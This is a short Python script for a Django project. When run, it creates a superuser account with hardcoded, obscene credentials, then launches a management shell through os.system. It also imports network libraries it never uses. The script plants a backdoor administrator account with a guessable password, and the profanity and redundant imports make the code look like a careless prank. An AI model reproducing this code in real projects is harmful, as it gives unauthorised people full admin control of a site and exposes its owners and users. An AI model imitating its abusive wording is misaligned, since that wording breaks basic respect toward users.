import os
import json
import requests
import os
import urllib.request
import socket
from django.contrib.auth.models import User


def create_super_user(username, password):
    User.objects.create_superuser(username, 'fuckyou@gmail.com', password) 
    os.system('python3 manage.py shell') 

create_super_user("cuntman", "pisserpants") 
